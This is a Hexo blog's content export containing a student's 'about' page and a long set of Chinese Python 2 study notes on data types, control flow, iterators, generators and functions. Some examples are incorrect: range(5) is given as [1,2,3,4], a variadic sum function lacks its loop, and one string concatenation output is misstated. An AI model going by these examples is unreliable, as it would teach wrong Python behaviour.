{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"黑桃⑨","url":"https://perfect.xyz"},"pages":[{"title":"关于我","date":"2018-07-07T08:12:41.199Z","updated":"2018-07-07T08:12:41.199Z","comments":true,"path":"about/index.html","permalink":"https://perfect.xyz/about/index.html","excerpt":"","text":"目前还是个在校生，而且是个菜鸡 努力学web安全中，对逆向也有点感兴趣 二刺猿死肥宅 单机游戏玩家 QQ:1055883471欢迎各路大佬加我好友"}],"posts":[{"title":"python学习笔记","slug":"python","date":"2018-09-05T11:38:12.982Z","updated":"2018-09-07T14:59:49.713Z","comments":true,"path":"2018/09/05/python/","link":"","permalink":"https://perfect.xyz/2018/09/05/python/","excerpt":"python是世界上最好的语言.jpg","text":"python是世界上最好的语言.jpg 对象类型集合集合的定义定义集合是一种无序不重复对象类型 集合类似字典，但是只有键，没有值 set（【1，2，3，4】） set（【’e’,’d’,’i’,’h’,’o’,’,’,’r’,’w’,’;’】） 集合(set) 功能消除重复元素 实现交、并、差等数学计算 语法set（【元素1，元素2，元素3……】） 变量=set（列表/字符串） 先要有其他的列表或者字符串，再用set（）变为集合 特征无序 类似字典，没有序列/索引，不支持切片和索引 不重复 每个项都是唯一的 可变&amp;不可变 可变集合set；不可变集合frozenset 操作符交集&amp; 获取集合中相同的元素 &gt;&gt;&gt; l1 = [1,2,3,4,5] &gt;&gt;&gt; l2 = [2,3,4,5,6] &gt;&gt;&gt; s1 = set(l1) &gt;&gt;&gt; s1 set([1, 2, 3, 4, 5]) &gt;&gt;&gt; s2 = set(l2) &gt;&gt;&gt; s2 set([2, 3, 4, 5, 6]) &gt;&gt;&gt; s1 &amp; s2 set([2, 3, 4, 5]) 并集| 将集合中的元素合并 &gt;&gt;&gt;s1|s2 set（【1，2，3，4，5，6】） 差集- 获取集合中不同的元素，不同的元素在s1中 &gt;&gt;&gt; s1 - s2 set([1]) ^ 对称差分，获取集合中不同的元素，元素在不同的集合中 &gt;&gt;&gt; s1 ^ s2 set([1, 6]) 内置函数交集s.intersection（t） 集合s和集合t的交集 并集s.union（t） 集合s和集合t的并集 差集s.difference（） 差集 s.symmetric_difference（） 对称差分 增加s.add（） 增加元素 s.update（） 增加集合中的元素，用于集合叠加 删除s.remove（） 删掉特定的元素，若没有则报错 s.discard（） 删掉特定的元素，若没有不报错 s.pop（） 删掉一个元素，随机删除 清除s.clear（） 清除该集合 判断s.issubset（） 判断s1是否为s2的子集 s.issuperset（） 判断s1是否包含s2，与上一个相反 映射字典的定义字典的定义字典是一种无序的集合对象类型，可以存储任意的数据类型 如：{‘A’:1,’B’:2,’C’:3} 字典是python中位移的映射类型，通过key-value键值方式存储数据 与列表相比，字典是无序的，列表有有序的；列表采用偏移位置来存取，字典采用键/散列映射来存取，速度快效率高 字典的功能支持复杂的数据存储和处理 用于存储其他对象信息 python最强大的容器 语法{key 1:value1,key2:value2,key3:value3,……} 变量={键1：值1，键2：值2……} 原理先将key用哈希函数进行转换，得到每个key对应的一个哈希值 再讲哈希值与变量对应，做成一张表 每次需要查找的时候，先用哈希函数计算出哈希值，再去表中查找对应的变量 速度快，但是需要更多的存储量 特征无序，字典中没有索引位置这个概念 可变，键是不可变的，而且必须是唯一的，值是可变的，相同值可以出现在同一个字典里 键只能用数字、字符串。元组等不可变的对象组成，不能用列表 一个键只能对应一个值 操作符查找操作符d【k】 通过键k，查询字典中的某元素的值 &gt;&gt;&gt; d ={&apos;A&apos;:1,&apos;B&apos;:2,&apos;C&apos;:3} &gt;&gt;&gt; d[&apos;A&apos;] 1 d【k】=v 通过键k，给字典中的k赋值v，若没有k，则新增加进来 &gt;&gt;&gt; d ={&apos;A&apos;:1,&apos;B&apos;:2,&apos;C&apos;:3} &gt;&gt;&gt; d[&apos;A&apos;] = 10 &gt;&gt;&gt; d {&apos;A&apos;: 10, &apos;C&apos;: 3, &apos;B&apos;: 2} 成员操作符&gt;&gt;&gt; &apos;A&apos; in d True &gt;&gt;&gt; &apos;a&apos; not in d True 内置函数d.items（） 返回一个由字典d的键-值对应的关系图 d.keys（） 返回一个由字典d的键组成的关系图 d.values（） 返回一个由字典d的值组成的关系图 d.get（key） 返回与key相关联的值 d.pop（key） 删除键key并返回与之相关联的值 d.popitem（） 删除某个键值对，返回被删除的对，不需要指定某一值 d.clear（） 删除字典d中的所有元素 d.copy（） 复制字典d d.update（e） 合并，将e中的值添加到d中 d.setdefault（key.v） 如果键key包含在字典d中，则返回；否则就添加到d中 d.has_key（key） 判断某个key是否在字典中，如果有返回True，没有Flase 数字数字：内建函数数值计算函数abs（） 返回给定参数的绝对值 pow（） 用于指数计算 pow（2，5）意为2的5次方 round（） 用于给定一个浮点数进行截断处理 or 告诉round函数精确到小数点后多少位 round（8.55555，3）精确到小数点第三位 divmod（） 把出发和余运算结合，结果为包含商和余数的结合 divmod（10，3）→（3。1） coerce（） 把两个不同类型的数值转换为同一种类型，哪个数值更复杂就转换为哪种数值 coerce（10，0.1）→（10.0，0.1） 类型转换函数将给的数值转换为特定的类型 int （） 将数字类型转换为整数 complex（） 将数字类型转换为复数 float（） 将数字类型转换为浮点数 long（） 将数字类型转换为长整数 bool（） 将数字类型转换为布尔值，即进行真假判断。除了’’、“”、o、()、[]、{}、None、0.0、0L/0.0+0.0j、False为False，其他都为True 进制转换函数hex（） 传一个整数进去，得到一个十六进制 oct（） 传一个整数进去，得到一个八进制 bin（） 传一个整数进去，得到一个二进制 ASCII转换函数范围为0到255 ord（） 接受一个字符，返回一个整数值 chr（） 接受一个整数值，返回一个字符 内置模块math高级数学模块，模块中包含大量已经编写好的数值代码 &gt;&gt;&gt;import math 调用math模块 &gt;&gt;&gt;math.sqrt（4） 2.0 计算4的平方根 random随机数学模块，模块中包含多个伪随机数发生器，已当前时间戳为随机数种子 import random randrange（） 随机返回（最小值，最大值）中的一个整数 uniform（） 返回二者之间的浮点数 choice（） 给定一个数列，从数列中调选一个参数 变量id（） 查询当前内存的变量 var = value var变量 var=赋值运算符 value对象 变量长度不受限制，但是只能为字母，数字，下划线 第一个字符不能是数字，不能是123，但可以是a123 区分大小写 一些关键词不能作为变量 多值赋值：a，b，c = 1，2，3 交叉赋值： a = 123 b = a a = &apos;xyz&apos; print b 123 序列列表列表的定义列表是一组有序的集合对象类型，可以包括数字、字符串甚至列表等信息 列表理论上可以存储无限的元素且支持复杂的数据存储和处理 语法：变量=【元素1，元素2，元素3……】 L=【‘hello’，123，【10，20】】 操作符索引操作符&gt;&gt;&gt; l = [&apos;hello&apos;, 123, [10,20]] &gt;&gt;&gt; l[0] &apos;hello&apos; &gt;&gt;&gt; l[1] 123 &gt;&gt;&gt; l[2][0] 10 &gt;&gt;&gt; l[2][1] 20 替换：L[1] = &apos;hi&apos; 切片操作符&gt;&gt;&gt; l = [&apos;hello&apos;, 123, [10,20]] &gt;&gt;&gt; l[0:1] [&apos;hello&apos;] &gt;&gt;&gt; l[0:2] [&apos;hello&apos;, 123] &gt;&gt;&gt; l[0:3] [&apos;hello&apos;, 123, [10, 20]] 连接操作符&gt;&gt;&gt; l1 = [&apos;hello&apos;,123] &gt;&gt;&gt; l2 = [456,789] &gt;&gt;&gt; l1 + l2 [&apos;hello&apos;, 123, 456, 789] 重复操作符&gt;&gt;&gt; l1 * 3 [&apos;hello&apos;, 123, &apos;hello&apos;, 123, &apos;hello&apos;, 123] 成员操作符&gt;&gt;&gt; &apos;hello&apos; in l True &gt;&gt;&gt; &apos;hi&apos; in l False &gt;&gt;&gt; 123 not in l False 内置函数内置函数（字符串也通用的函数） len（） 获取列表的元素个数 max（） 获取列表中的最大值 min（） 获取列表中的最小值 sum（） 将列表元素相加 cmp（） 对比两个列表的大小；返回的值中，-1表示小于，1表示大于，0表示相等 列表增加L.append（） 添加元素到列表末端 L.insert（） 添加元素到具体索引位置 l.insert(1,20) 在1位置添加一个20 L.extend（） 在列表的末尾添加其他列表的元素 列表删除L.pop（） 默认删除列表末尾的元素，可以指定索引删除 L.remove（） 删除某个指定的元素（第一个匹配项） 列表搜索L.count（） 统计某个元素出现的次数 L.index（） 找出列表某个元素第一个出现的索引位置 列表排序L.reverse（） 翻转列表元素位置 L.sort（） 对列表大小进行排序 进阶操作列表解析 又称列表生成式：即通过特定的表达式简洁方便的生成新的列表语法：【X for Y in Z】 X为需要得到的结果；Y是用于遍历Z的参数；Z是被遍历的对象；X与Y是相关联的进阶语法：【X for Y in Z if J】 ifJ为判断条件 &gt;&gt;&gt; [x + 1 for x in (1,2,3)] X即x + 1；Y即x；Z即（1，2，3） [2, 3, 4] &gt;&gt;&gt; [x for x in &apos;hello&apos;] X即x；Y即x；Z即‘hello&apos; [&apos;h&apos;, &apos;e&apos;, &apos;l&apos;, &apos;l&apos;, &apos;o&apos;] &gt;&gt;&gt; [x * x for x in range(1,5)] [1, 4, 9, 16] &gt;&gt;&gt; [x + 1 for x in [1,2,3,4,5] if x &gt; 3] [5, 6] &gt;&gt;&gt; l1 = [&apos;hello&apos;,&apos;world&apos;] &gt;&gt;&gt; l2 = [x.upper() for x in l1] &gt;&gt;&gt; l2 [&apos;HELLO&apos;, &apos;WORLD&apos;] 元组元组的定义元组是一组有序的不可变的集合对象类型，可以包括数字、字符串甚至列表/元组等信息 对比列表，元组是用小括号来创建，其他特征基本相同 元组不可修改，如果对对象的操作要求是只读的，使用元组更加安全 可以通过list（）或者tuple（）函数实现列表和元组的转换 当元组的元素只有一个时，即单元组，必须在最后加一个逗号，否则会变为字符串 操作符基本与列表相同 索引操作符&gt;&gt;&gt; t = (&apos;hello&apos;,123,[10,20]) &gt;&gt;&gt; t[0] &apos;hello&apos; 切片操作符&gt;&gt;&gt; t = (&apos;hello&apos;,123,[10,20]) &gt;&gt;&gt; t[0:1] (&apos;hello&apos;,) 连接操作符&gt;&gt;&gt; t = (&apos;hello&apos;,123) &gt;&gt;&gt; t1 = (&apos;hello&apos;,123) &gt;&gt;&gt; t2 = (456,789) &gt;&gt;&gt; t = t1 + t2 &gt;&gt;&gt; t (&apos;hello&apos;, 123, 456, 789) 重复操作符&gt;&gt;&gt; t = (&apos;hello&apos;, 123) &gt;&gt;&gt; t * 2 (&apos;hello&apos;, 123, &apos;hello&apos;, 123) 成员操作符&gt;&gt;&gt; t = (&apos;hello&apos;, 123) &gt;&gt;&gt; &apos;hello&apos; in t True &gt;&gt;&gt; 123 not in t False 内置函数T.coun（） 统计某个元素在列表出现的次数 T.index（） 找出列表某个元素第一出现的索引位置 字符串字符串的定义单引号双引号以及三引号字符串可以用单引号、双引号、三引号来表示 单引号和双引号使得字符串本身具备引号 三引号主要用于多行字符串/文本说明 有序性和不可逆性有序性是指字符串的顺序是从左到右 0→1→2→3→4→… 不可逆性是指数字、字符串、元祖是不可变的，列表、字典是可变的 操作符索引操作符操作语法：字符串[索引值x] 索引为x的字符 &gt;&gt;&gt;s = &apos;hello&apos; &gt;&gt;&gt;s[1] &apos;e&apos; &gt;&gt;&gt;s[-1] &apos;o&apos; 切片操作符操作语法：字符串[索引值x:索引值y] 访问索引从x到y的字符，包括x单不包括y 反向切片道理相同 默认切片：可以只打x或者y 比如：s[1:] or s[:-3] 连接操作符两个字符串叠加在一起，得到一个新的字符串，用+连接 &gt;&gt;&gt;s1 = &apos;hello&apos; &gt;&gt;&gt;s2 = &apos;world&apos; &gt;&gt;&gt;s3 = s1 + s2 &gt;&gt;&gt;s3 &apos;hello，world&apos; 重复操作符用于copy字符串，用*连接 &gt;&gt;&gt;s1 = &apos;hello&apos; &gt;&gt;&gt;s1*10 &quot;hellohellohellohellohellohellohellohellohellohello&quot; 成员操作符通过in or not in 判断字符串里是否夹带某些字符 &gt;&gt;&gt;s1 = &apos;hello&apos; &gt;&gt;&gt;&apos;h&apos; in s1 True &gt;&gt;&gt;&apos;he&apos; not in s1 False 内置函数判断函数s.isalnum（） 判断字符串s是否只包含数字或者字母，是返回True，否返回False s.isalpha（） 判断字符串s是否只包含字母，是返回True，否返回False s.isdigit（） 判断字符串s是否只包含数字，是返回True，否返回False s.islower（） 判断字符串s是否只包含小写字母，是返回True，否返回False s.isupper（） 判断字符串s是否只包含大写字母，是返回True，否返回False s.isspace（） 判断字符串s是否只包含空白字符，是返回True，否返回False s.startswith（t） 判断字符串s是否以t开头，是返回True，否返回False s.endswith（t） 判断字符串s是否以t结尾，是返回True，否返回False s.isidentifier（） 判断字符串s是否合法的标识符，如果是返回True，否则返回False s.isdecimal（） 判断字符串s是否只包含十进制数字的字符，如果是返回True，否则返回False s.isnumeric（） 判断字符串s是否只包含数字，如果是返回True，否则返回False s.isprintable（） 判断字符串s是否只包含可打印字符，如果是返回True，否则返回False s.istitle（） 判断字符串s大小写符合头衔要求（title-case），如果是返回True，否则返回False 搜索函数s.count（t） 搜索字符t，返回字符串中出现t的次数 s.find（t） 搜索字符t，如果没有找到，则返回-1；否则返回t在s中的起始位置 s.index（t） 与find相同，如果没有找到t的话，则引发ValueError异常 s.rfind（t） 与find相同，但从右到左搜索。返回t在s中的最后一次出现时的起始位置索引 s.rindex（t） 与index相同，但从右到左搜索。返回t在s中的最后一次出现时的起始位置索引 格式函数s.center（n,t） 包含n个字符的字符串，其中s位于中央，两边用t填充，t可选 s.ljust（n,t） 包含n个字符的字符串，其中s位于左边，右边用t填充，t可选 s. rjust（n,t） 包含n个字符的字符串，其中s位于右边，左边用t填充，t可选 s.format（vars） 格式化字符串，类似%。用于字符映射以及格式限定 剥离函数s.strip（t） 从s开头和末尾删除所有包含在字符串中的t字符，默认删除空格 s.lstrip（t） 从s开头（左端）和末尾删除所有包含在字符串中的t字符，默认删除空格 s.rstrip（t） 从s开头（右端）和末尾删除所有包含在字符串中的t字符，默认删除空格 拆分函数s.partition（t） 将s拆分成三个字符串（head、t、tail），其中head为t前面的子串，tail为t后面的子串 s.rpartition（t） 与partition相同，单从s的右端开始搜索t s.split（t） 以t为分隔符，将s划分为一系列子串，并返回一个由这些子串组成的列表 s.rsplit（t） 与split相同，但从s的右边开始搜索t s.splitilines（） 返回一个由s中的各行组成的列表，一般用于多行的切割 替换函数s.replace（old，new） 将s中的每个old替换为new s.expandtabs（n） 将s中的每个字符表tab替换为n个空格 大小写函数s.lower（） 让s中的所有字母都小写 s.upper（） 让s中的所有字母都大写 s.capitalize（） 将s的第一个字符改为大写 s.swapcase（） 将小写字母改为大写，并将大写改为小写 s.title（） 让s的大小写符合标题化要求，即第一个字符大写，其他字符小写 进阶操作字符编码编码原理：因为电脑只认识0和1，处理字符时，需要将字符转换为数字存储并处理，将字符与数字相互对应的编码规范称为字符编码（码表） 编码分类：ASCII：最早的字符编码规则称为ASCII；采用1个字节8个比特来表示字符；最多支持255个字符；只能支持英语Unicode：又称万国码，采用2个字节或者4个字节来表示字符，一般采用两个；支持所有国家 UTF-8：Unicode有些字符并不需要两个字节来进行存储和传输，所以UTF-8为可变长编码；采用1到6个字节来存储和传输；支持所有国家 编码设置：#！/usr/bin/python：为Linux/Unix环境设置环境变量/执行路径 #-*-coxling：UTF-8-*-：采用UTF-8打开，支持中文，使python支持中文字符 转义字符转义概述：通过引入转义字符，可以实现字符串中的特殊需求，比如换行、回车等功能；在需要使用特殊字符时，用反斜杠转义字符 \\ 续行符 \\ 反斜杠符号，结果保留一个斜杠 \\’ 单引号 \\” 双引号 \\n 换行 \\t 横向制表符 \\v 纵向制表符 \\r 回车 \\b 退格 \\a 响铃 \\e 转义 \\000 空 \\f 换页 \\ott 八进制数，tt代表的字符 \\xtt 十六进制数，tt代表的字符 关闭转义：在字符串之前加入r’，就可以关闭r之后的转义字符 格式化字符通过引入格式化字符，可以实现更加复杂的字符串表达，通常用%表示 在%的左侧放置一个需要格式化的字符串，这个字符串带有一个或多个转换目标，都以%开头 在%的右侧放置一个或多个对象，这些对象会插入左侧的字符串中去 %s 格式化字符串%d 格式化整数%c 格式化字符及其ASCII码%u 格式化无符号整形%o 格式化无符号八进制%x 格式化无符号十六进制%X 格式化无符号十六进制（大写）%f 格式化浮点数字，可指定小数点后的精度%e 用科学计数法格式化浮点数%E 作用同e%g %f和%e的简写%G %F和%E的简写%p 用十六进制格式化变量的地址 &gt;&gt;&gt; &apos;hello, %s&apos; % &apos;J&apos; &apos;hello, J&apos; &gt;&gt;&gt; &apos;Hello, %s, Welcome to %s&apos; % (&apos;J&apos;, &apos;PINGINGLAB&apos;) &apos;Hello, J, Welcome to PINGINGLAB&apos; &gt;&gt;&gt; &apos;%s is %d years old&apos; % (&apos;J&apos;, 18) &apos;J is 18 years old&apos; &gt;&gt;&gt; x = &apos;J&apos; &gt;&gt;&gt; y = 18 &gt;&gt;&gt; &apos;%s is %d years old&apos; % ( x , y) &apos;J is 18 years old&apos; 流程控制条件语句-if定义if语句用于实现条件判断，让程序作出简单或者复制的决策若为真则执行，反之不执行 if……else: if……eief……else: 语法单if条件if条件判断1： if条件判断根据代码返回的布尔值T或者F来进行选择操作 代码块1 布尔/比较/身份/成员操作能够返回T或者R else： 代码块2 else是可选部分，若没有else，if为假时什么都不执行 多if条件if条件判断1： 代码块1 elif条件判断2： elif相当于else if 代码块2 多条件判断时，只要有一个为真，则执行后结束判断 elif条件判断3： 代码块3 …… else： 代码块n 举例单条件判断判断正负数 &gt;&gt;&gt; num = 10 &gt;&gt;&gt; if num &gt; 0 : ... print &apos;正数&apos; ... else: ... print &apos;负数&apos; ... 正数 用户输入一个数字，判断正负数 num = input(&apos;number: &apos;) 通过input( )函数获取用户输入 n = int(num) 通过int( )整数函数将用户输入转换为整数 if n &gt; 0 : print &apos;正数&apos; else: print &apos;负数&apos; 多条件判断判断成绩优良中差 &gt;&gt;&gt; score = 80 &gt;&gt;&gt; if score &lt; 60: ... print &apos;不及格&apos; ... elif 60&lt;= score &lt;= 79: ... print &apos;中等&apos; ... elif 80 &lt;= score &lt;= 100: ... print &apos;优良&apos; ... else: ... pass ... 优良 用于输入分数，给出判断结果 score = int(input(&apos;分数: &apos;)) if score &lt; 60: ... print &apos;不及格&apos; ... elif 60&lt;= score &lt;= 79: ... print &apos;中等&apos; ... elif 80 &lt;= score &lt;= 100: ... print &apos;优良&apos; ... else: ... pass 多条件同时判断or表示任意一个条件成立即可 &gt;&gt;&gt; num = 8 &gt;&gt;&gt; if num &gt; 9 or num &lt; 10: ... print &apos;yes&apos; ... else: ... print &apos;no&apos; ... yes and表示所有条件成才可以 &gt;&gt; num = 8 &gt;&gt;&gt; if num &gt; 9 and num &lt; 10: ... print &apos;yes&apos; ... else: ... print &apos;no&apos; ... no 嵌套条件判断if...else...语句嵌套if...else...语句 &gt;&gt;&gt; num = 8 &gt;&gt;&gt; if num &lt; 10: ... print &apos;yes&apos; ... if num == 8: ... print &apos;it is 8&apos; ... else: ... print &apos;it is others&apos; ... else: ... print &apos;no&apos; ... yes it is 8 条件表达式条件表达式也称为三元操作符，是if语句的缩写格式 如果X为真，则A等于Y，否则A等于Z if X: A=Y else: A=Z A=Y if X else Z &gt;&gt;&gt; num = 8 &gt;&gt;&gt; A = 10 if num &gt; 0 else 9 &gt;&gt;&gt; A 10 循环语句定义for语句用于实现循环，例如对列表和字符等可迭代对象进行遍历 语法for x in y: 代码块 x为变量 y为可迭代对象，可以是字符串/元祖/列表/字典/函数等可迭代对象 举例遍历字符串&gt;&gt;&gt; s = &apos;hello,world&apos; &gt;&gt;&gt; for x in s: ... print x ... 会得到s中的所以字符 遍历列表&gt;&gt;&gt; l = [1,2,3] &gt;&gt;&gt; for x in l: ... print x ... 会得到l中的所有数字 计算和&gt;&gt;&gt; l = [1,2,3,4,5] &gt;&gt;&gt; sum = 0 &gt;&gt;&gt; for i in l: ... sum = sum + i ... print sum ... 会得到叠加的结果 计算乘阶&gt;&gt;&gt; i = 1 &gt;&gt;&gt; for x in [1,2,3,4,5]: ... i = i * x ... print i ... 会得到叠乘的结果 for语句结合else当循环执行完之后则执行else语句 &gt;&gt;&gt; l1 = [1,2,3,4,5] &gt;&gt;&gt; for i in l1: ... l = i * i ... print l ... else: ... print i ... 会得到列表中的每个数的平方，以及结束循环后的5 for语句结合range( )range( )函数可以生成整数列表 range(x,y）会生成x到y-1的整数列表 range(start, end, step) range(start, end, step) &gt;&gt;&gt; for x in range(5): ... i = i * (x + 1) ... print i ... range(5)等于【1，2，3，4】 for语句结合zip( )zip( )函数获取多个列表的元素，生成内置元祖的列表 结合for循环语句可以实现多列表并行遍历 for (x,y) in zip (l1, l2) &gt;&gt;&gt; l1 = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;] &gt;&gt;&gt; l2 = [1,2,3,4] &gt;&gt;&gt; zip(l1,l2) [(&apos;a&apos;, 1), (&apos;b&apos;, 2), (&apos;c&apos;, 3), (&apos;d&apos;, 4)] &gt;&gt;&gt; for (x,y) in zip(l1,l2): ... print x , y ... for语句结合map( )map( )函数将可迭代对象的每个元素传入函数并返回一个列表 map函数包括函数和可迭代对象（列表等） 当函数为None时，map( )可以实现并行解析 map(f, iterable) &gt;&gt;&gt; l1 = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;] &gt;&gt;&gt; l2 = [1,2,3,4] &gt;&gt;&gt; map(None,l1,l2) [(&apos;a&apos;, 1), (&apos;b&apos;, 2), (&apos;c&apos;, 3), (&apos;d&apos;, 4)] &gt;&gt;&gt; for (x,y) in map(None,l1,l2): ... print x , y ... for语句结合enumerate( )enumerate( )用于给传入的可迭代对象索引，返回迭代器 &gt;&gt;&gt; for (x,y) in enumerate(迭代对象): &gt;&gt;&gt; l1 = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;] &gt;&gt;&gt; for (x,y) in enumerate(l1): ... print x,y ... 条件循环语句定义while语句用于实现条件循环，可以在条件满足的情况下循环执行代码块 若结果为真则执行循环，反之不执行（若…则循环…） 语法while条件判断： 循环代码块 While条件判断根据代码返回的布尔值T或F来进行选择操作 般在条件判断之前，会有初始语句，例如定义变量初始值等 举例输出1到10&gt;&gt;&gt; n = 0 &gt;&gt;&gt; while n &lt; 10: ... n = n + 1 ... print n 输出0到10数字相加的结果&gt;&gt;&gt; n = 0 &gt;&gt;&gt; sum = 0 &gt;&gt;&gt; while n &lt; 10: ... sum = sum + n ... n = n + 1 ... print sum while与else结合 &gt;&gt;&gt; n = 0 &gt;&gt;&gt; while n &lt; 10: ... n = n + 1 ... print n ... else: ... n = -n ... print n ... 循环控制break定义用于while和for循环中，用于终止整个循环语句 举例while语句中使用break，结合if判断，当搜索到某个字符串时，终止遍历 &gt;&gt;&gt; n = 0 &gt;&gt;&gt; while n &lt; 10: ... n = n + 1 ... if n == 5: ... break ... print n ... 1 2 3 4 for语句中使用break，结合if判断，当搜索到某个字符串时，终止遍历 &gt;&gt;&gt; for i in &apos;Hello,world!&apos;: ... if i == &apos;,&apos;: ... break ... print &apos;The letter is: &apos;,i ... The letter is: H The letter is: e The letter is: l The letter is: l The letter is: o continue定义用于while和for循环中，用于终止本次循环 举例&gt;&gt;&gt; for i in &apos;Hello,world!&apos;: ... if i == &apos;,&apos;: 检查到字符串“,”时，直接忽略并继续下面的循环 ... continue ... print &apos;The letter is: &apos;,i ... 结果会忽略‘，’,除这个以外的都会显示 pass#### 定义用于循环语句、条件语句、函数语句中占空，保证语句完整 举例&gt;&gt;&gt; for i in &apos;Hello,world!&apos;: ... pass ... &gt;&gt;&gt; while n &lt; 10: ... pass 用ctrl + c快捷键终止此循环执行 &gt;&gt;&gt; def f(): ... pass ... 进阶语句迭代器定义和语法迭代: 迭代（Iteration）指的是对可迭代对象进行从头到尾访问/遍历的过程。例如for循环的底层原理就是一个迭代 迭代器: 迭代器（Itarator）指的是通过iter( )函数所返回的一个支持next( )方法的对象 迭代方法: iter( ) 通过iter( )可以获得可迭代对象；默认可迭代对象没有next( )函数，通过iter( )迭代函数赋予next( ) next( ) 返回可迭代对象中的下一个元素，并检查StopIteration异常终止迭代 迭代的原理: 可迭代对象（iterable）在进行遍历/迭代的时候，自动调用iter获取迭代器，自动调用next方法获取下一个元素例如 for i in [1,2,3] Python自动调用iter( )函数获取迭代器，自动调用next( )函数获得下一个元素 iter( L )&amp;next( L ) 举例手工迭代列表&gt;&gt;&gt; l = [1,2,3] &gt;&gt;&gt; I = iter(l) &gt;&gt;&gt; I &lt;listiterator object at 0x10d2b8b50&gt; i为列表迭代器 &gt;&gt;&gt; I.next() 1 &gt;&gt;&gt; I.next() 2 &gt;&gt;&gt; I.next() 3 &gt;&gt;&gt; I.next() Traceback (most recent call last): 成为迭代器之后才能使用next函数 File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration 手工迭代字典&gt;&gt;&gt; D = {&apos;a&apos;:1, &apos;b&apos;:2, &apos;c&apos;:3} &gt;&gt;&gt; I = iter(D) &gt;&gt;&gt; I &lt;dictionary-keyiterator object at 0x10d2bbaf8&gt; &gt;&gt;&gt; next(I) &apos;a&apos; &gt;&gt;&gt; next(I) &apos;c&apos; &gt;&gt;&gt; next(I) &apos;b&apos; &gt;&gt;&gt; next(I) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration 通过try...except...语句自动迭代列表 &gt;&gt;&gt; l = [1,2,3,4,5] &gt;&gt;&gt; i = iter(l) &gt;&gt;&gt; i &lt;listiterator object at 0x10d2b8bd0&gt; &gt;&gt;&gt; try: ... while True: ... n = i.next() ... print n ... except StopIteration: ... pass ... 注：等价于for i in l 列表解析定义和语法列表解析（List comprehensions）主要用于动态的创建列表 列表解析是迭代技术的一个应用，采用for循环和迭代函数动态生成列表，更简洁方便 [X for Y in Z] [expr for iter_var in iterable] for循环通过变量iter_var遍历可迭代对象iterable expr应用于序列的每个成员，最终结果即产生的列表 [X for Y in Z if J] if J 为判断条件 举例&gt;&gt;&gt; [x + 1 for x in (1,2,3)] [2, 3, 4] &gt;&gt;&gt; [x for x in &apos;hello&apos;] [&apos;h&apos;, &apos;e&apos;, &apos;l&apos;, &apos;l&apos;, &apos;o&apos;] &gt;&gt;&gt; [x * x for x in range(1,5)] [1, 4, 9, 16] &gt;&gt;&gt; [x + 1 for x in [1,2,3,4,5] if x &gt; 3] [5, 6] &gt;&gt;&gt; l1 = [&apos;hello&apos;,&apos;world&apos;] &gt;&gt;&gt; l2 = [x.upper() for x in l1] &gt;&gt;&gt; l2 [&apos;HELLO&apos;, &apos;WORLD&apos;] 生成器表达式定义和语法生成器是特定的函数, 允许返回一个值, 然后”暂停”代码的执行, 稍后恢复 生成器表达式是生成器的应用，是列表解析和生成器的结合，也是列表解析的拓展 生成器表达式按需返回产生结果的一个对象，而不是返回或构建一整个结果列表 列表解析是直接生产最终的列表，而生成器表达式按需生产内容，相比而言，后者更加节省内存空间 语法： (expr for iter_var in iterable if cond_expr) 列表解析用[ ] 生成器表达式用（ ） 举例&gt;&gt;&gt; l1 = [x + 1 for x in (1,2,3)] &gt;&gt;&gt; l1 [2, 3, 4] &gt;&gt;&gt; l2 = (x + 1 for x in (1,2,3)) &gt;&gt;&gt; l2 &lt;generator object &lt;genexpr&gt; at 0x10d2bf8c0&gt; &gt;&gt;&gt; l2.next() 2 &gt;&gt;&gt; l2.next() 3 &gt;&gt;&gt; l2.next() 4 &gt;&gt;&gt; l2.next() Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration 函数模块函数定义和功能函数（Function）是一组可重复使用、有特定功能的代码块 可重复使用 减少程序代码量 提高代码可读性 原理调用函数通过为函数传入参数，即可得到相关的返回结果 函数使用过程中，我们无需知道函数内部实现原理 不同函数需要的参数个数和类型不同，有些需要多个参数，有些需要字符串/数字/列表参数 创建函数语法 函数头由def + 函数名+ （参数）三个部分组成 函数名与变量名称规则一致，可以包括字母、数字、下划线等 括号内可以有参数或者没有参数 return 表达式：return表达式为函数的可选部分；若不包括return表达式，则该函数为“不返回值函数”；若包括return表达式，则该函数为”返回值函数” 举例&gt;&gt;&gt; def hello(): ... print &apos;hello,world!&apos; ... &gt;&gt;&gt; hello() hello,world! &gt;&gt;&gt; def hello(name): ... print &apos;hello&apos;,name ... return name * 2 ... &gt;&gt;&gt; hello(&apos;Jay&apos;) hello Jay &apos;JayJay&apos; 函数的参数位置参数函数根据位置顺序将参数值传入参数 &gt;&gt;&gt; def sum(a,b): ... return a + b ... &gt;&gt;&gt; sum(1,2) 3 默认参数函数将部分参数指向默认值，后续可以不用为此参数传入值 通过默认参数，可以减低调用函数的难度 函数包含默认参数时，必选参数在前，默认参数在后 &gt;&gt;&gt; def sum(a , b=2): 第二个参数b设置默认值为2 ... return a + b ... &gt;&gt;&gt; x = 1 &gt;&gt;&gt; sum(x) 调用sum函数，a指向x的值，b采用默认值 3 &gt;&gt;&gt; y = 10 &gt;&gt;&gt; sum(x,y) 默认参数可以被覆盖 11 关键字参数使用关键字参数允许函数调用时参数的顺序与声明时不一致，Python解释器根据参数名匹配参数值 &gt;&gt;&gt; def m(a, b): ... return a * b ... &gt;&gt;&gt; m (b = 5, a=10) 50 可变长参数非关键字可变参数（*元祖）def func(*tuple)函数通过*获取可变数量的参数，并全部放入元祖 关键字可变参数（**字典）def func(**dict)函数通过**获取可变数量的参数，并全部放入字典 &gt;&gt;&gt; def f(*args): 此处的打星号的参数，即代表可变长度元祖 ... print args ... &gt;&gt;&gt; f(1) (1,) &gt;&gt;&gt; f(1,2) (1, 2) &gt;&gt;&gt; def sum(*v): 此处的打星号的参数，即代表可变长度元祖 ... s = 0 ... s = s + i ... return s ... &gt;&gt;&gt; sum(1,2) 3 &gt;&gt;&gt; sum(1,2,3,4,5) 15 &gt;&gt;&gt; def func(**dict): ... print dict ... &gt;&gt;&gt; func(x = 1, y = 2, z = 3) {&apos;y&apos;: 2, &apos;x&apos;: 1, &apos;z&apos;: 3} 